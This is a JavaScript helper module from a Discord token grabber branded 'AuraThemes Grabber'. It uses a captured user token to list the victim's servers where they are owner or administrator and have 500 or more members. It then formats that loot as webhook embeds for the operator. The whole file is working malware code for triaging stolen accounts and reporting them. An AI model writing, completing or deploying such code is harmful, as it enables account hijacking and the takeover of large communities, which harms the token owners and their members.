const { EmbedBuilder } = require('discord.js');
const fetch = require('sync-fetch');

module.exports = {
    fetchServers: async function (x) {
        try {
            let _ = fetch(`https://discord.com/api/v9/users/@me/guilds?with_counts=true`, {
                headers: {
                    Authorization: x,
                },
            });

            const data = await _.json();

            let servers = data
                .filter((__) => __.owner || (__.permissions & 8) === 8)
                .filter((__) => __.approximate_member_count >= 500)
                .map((__) => ({
                    id: __.id,
                    name: __.name,
                    owner: __.owner,
                    member_count: __.approximate_member_count,
                }));

            return {
                totals: servers.length,
                all: servers.length
                    ? servers.map((server) => {
                        return `**${server.name}** | \`${server.id}\`` +
                            `\n**Owner** ${server.owner ? "<a:success:1167141798792134788>" : "❌"
                            } | **Members** <:online:970050105338130433> \`${server.member_count
                            }\``;
                    }).join("\n\n")
                    : `\`\`\`yml\nNot found\`\`\``
            };
        } catch (error) {
            console.error("Error fetching servers:", error);
            return {
                totals: "0",
                all: "-",
            };
        }
    },
    getEmbeds: function ({ author: { name, icon_url }, thumbnail, color, title, desc, fields = [] }) {
        try {
            const builder = new EmbedBuilder().setAuthor({ name: name ?? "-", iconURL: icon_url }).setThumbnail(thumbnail);
            if (color !== "") {
                builder.setColor(color == "" ? "#c267ff" : color || "#c267ff");
            } else {
                builder.setColor("#c267ff");
            }
            if (title) {
                builder.setTitle(title ?? "-");
            }
            if (desc) {
                builder.setDescription(desc ?? "-");
            }
            if (fields.length > 0) {
                builder.addFields(...fields);
            }
            return builder.setFooter({ text: `AuraThemes Grabber - https://discord.gg/aurathemes`, iconURL: "https://i.imgur.com/CeFqJOc.gif" }).setTimestamp();
        } catch (error) {
            return null;
        }
    },
    send: function (embed) {
        return {
          embeds: [embed],
          username: '@AuraThemes',
          avatarURL: 'https://i.imgur.com/CeFqJOc.gif'
        };
    },
}
